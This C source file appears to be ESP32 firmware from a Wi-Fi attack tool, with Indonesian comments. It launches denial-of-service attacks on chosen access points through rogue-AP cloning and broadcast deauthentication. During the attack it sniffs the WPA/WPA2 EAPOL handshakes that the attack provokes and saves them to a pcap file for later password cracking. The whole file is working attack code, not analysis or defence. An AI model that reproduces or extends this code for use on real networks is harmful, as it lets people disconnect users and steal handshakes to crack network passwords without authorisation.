/**
 * @file attack_dos.c
 * @brief Implements DoS attacks using deauthentication methods with Handshake & State Machine Lock Upgrades
 */

#include <stdio.h>  // WAJIB ADA: Untuk fungsi penulisan file PCAP (fopen, fwrite, fclose)
#include "attack_dos.h"
#include "pcap_writer.h" // Menghubungkan fungsi global header Wireshark

#define LOG_LOCAL_LEVEL ESP_LOG_VERBOSE
#include "esp_log.h"
#include "esp_err.h"
#include "esp_wifi.h"

// Library FreeRTOS untuk manajemen Ring Buffer dan pengunci memori RAM
#include "freertos/FreeRTOS.h"
#include "freertos/task.h"
#include "freertos/semphr.h"
#include "freertos/ringbuf.h"

#include "attack.h"
#include "attack_method.h"
#include "wifi_controller.h"

static const char *TAG = "main:attack_dos";
static attack_dos_methods_t method = -1;

// Objek Ring Buffer statis untuk mengunci paket Handshake (EAPOL) di RAM agar tidak hilang
static RingbufHandle_t handshake_storage_buffer = NULL;
static SemaphoreHandle_t attack_mutex = NULL;

/**
 * @brief Fungsi Callback Promiscuous untuk menyaring dan mengunci paket Handshake WPA/WPA2 (EAPOL)
 */
static void upgrade_handshake_sniffer_cb(void *buf, wifi_promiscuous_pkt_type_t type) {
    if (type != WIFI_PKT_DATA && type != WIFI_PKT_MGMT) {
        return;
    }

    const wifi_promiscuous_pkt_p2p_t *pkt = (wifi_promiscuous_pkt_p2p_t *)buf;
    const uint8_t *payload = pkt->payload;
    uint16_t len = pkt->rx_ctrl.sig_len;

    // KOREKSI UTAMA: Cek tipe protokol ethernet (Offset 30-31 untuk EAPOL: 0x888E) menggunakan index array
    if (len > 34) {
        if (payload[30] == 0x88 && payload[31] == 0x8E) {
            ESP_LOGI(TAG, "Handshake WPA (EAPOL) Terdeteksi! Mengunci bita data ke RAM...");
            
            // Simpan paket jabat tangan secara instan ke Ring Buffer statis sebelum sistem interupsi
            if (handshake_storage_buffer != NULL) {
                BaseType_t res = xRingbufferSend(handshake_storage_buffer, (void *)payload, len, pdMS_TO_TICKS(10));
                if (res != pdTRUE) {
                    ESP_LOGE(TAG, "Gagal mengunci paket, Ring Buffer RAM penuh!");
                }
            }
        }
    }
}

void attack_dos_start(attack_config_t *attack_config) {
    if (attack_mutex == NULL) {
        attack_mutex = xSemaphoreCreateMutex();
    }

    xSemaphoreTake(attack_mutex, portMAX_DELAY);
    ESP_LOGI(TAG, "Starting DoS attack on %d targets with locking engine...", attack_config->target_count);
    method = attack_config->method;

    // Inisialisasi wadah buffer memori RAM jika belum dibuat
    if (handshake_storage_buffer == NULL) {
        handshake_storage_buffer = xRingbufferCreate(8192, RINGBUF_TYPE_NOSPLIT);
    }

    switch (method) {
        case ATTACK_DOS_METHOD_BROADCAST:
        case ATTACK_DOS_METHOD_COMBINE_ALL:
            // UPGRADE: Web UI 192.168.4.1 tetap hidup karena wifictl_mgmt_ap_stop() dibuang!
            esp_wifi_set_promiscuous(false);
            break;
        default:
            break;
    }

    for(int i = 0; i < attack_config->target_count; i++) {
        const wifi_ap_record_t *ap_record = attack_config->ap_records[i];

        // Kunci saluran radio (Channel Locking) secara statis di kanal target
        ESP_LOGI(TAG, "Locking Wi-Fi Radio Channel to: %d for Target: %s", ap_record->primary, ap_record->ssid);
        esp_wifi_set_channel(ap_record->primary, WIFI_SECOND_CHAN_NONE);

        switch(method) {
            case ATTACK_DOS_METHOD_ROGUE_AP:
                attack_method_rogueap(ap_record);
                break;
            case ATTACK_DOS_METHOD_BROADCAST:
                attack_method_broadcast(ap_record, 1);
                break;
            case ATTACK_DOS_METHOD_COMBINE_ALL:
                attack_method_rogueap(ap_record);
                attack_method_broadcast(ap_record, 1);
                break;
            case ATTACK_DOS_METHOD_SUPER_CLONE:
                attack_method_rogueap(ap_record);
                attack_method_super_clone(ap_record);
                break;
        }
    }

    // Aktifkan mesin sniffer jabat tangan biner paralel di latar belakang setelah kanal terkunci
    esp_wifi_set_promiscuous_rx_cb(&upgrade_handshake_sniffer_cb);
    esp_wifi_set_promiscuous(true);

    xSemaphoreGive(attack_mutex);
}

void attack_dos_stop() {
    if (attack_mutex == NULL) return;

    xSemaphoreTake(attack_mutex, portMAX_DELAY);
    
    // Matikan mode promiscuous sniffer terlebih dahulu agar radio stabil kembali
    esp_wifi_set_promiscuous(false);

    switch(method){
        case ATTACK_DOS_METHOD_ROGUE_AP:
            wifictl_mgmt_ap_start();
            wifictl_restore_ap_mac();
            break;
        case ATTACK_DOS_METHOD_BROADCAST:
            attack_method_broadcast_stop();
            break;
        case ATTACK_DOS_METHOD_COMBINE_ALL:
            attack_method_broadcast_stop();
            wifictl_mgmt_ap_start();
            wifictl_restore_ap_mac();
            break;
        case ATTACK_DOS_METHOD_SUPER_CLONE:
            attack_method_super_clone_stop();
            wifictl_mgmt_ap_start();
            wifictl_restore_ap_mac();
            break;
        default:
            ESP_LOGE(TAG, "Unknown attack method! Attack may not be stopped properly.");
    }

    // --- PROSES PENGUNCIAN PCAP KE MEDIA PENYIMPANAN ---
    if (handshake_storage_buffer != NULL) {
        // Simpan file hasil capture ke area SPIFFS data
        FILE* pcap_file = pcap_init_file("/data/handshake.pcap");
        
        if (pcap_file != NULL) {
            size_t packet_size;
            // Kuras semua paket jabat tangan (M1-M4) dari RAM Ring Buffer secara berurutan
            uint8_t* raw_packet = (uint8_t*)xRingbufferReceive(handshake_storage_buffer, &packet_size, pdMS_TO_TICKS(10));
            
            while (raw_packet != NULL) {
                pcap_write_packet(pcap_file, raw_packet, packet_size);
                vRingbufferReturnItem(handshake_storage_buffer, (void*)raw_packet);
                
                // Ambil paket berikutnya di dalam antrean RAM
                raw_packet = (uint8_t*)xRingbufferReceive(handshake_storage_buffer, &packet_size, pdMS_TO_TICKS(10));
            }
            
            pcap_close_file(pcap_file);
        }

        // Hapus wadah Ring Buffer RAM agar memori kembali lega
        vRingbufferDelete(handshake_storage_buffer);
        handshake_storage_buffer = NULL;
    }

    ESP_LOGI(TAG, "DoS attack stopped. Radio and SSID records reverted to safe state.");
    xSemaphoreGive(attack_mutex);
}
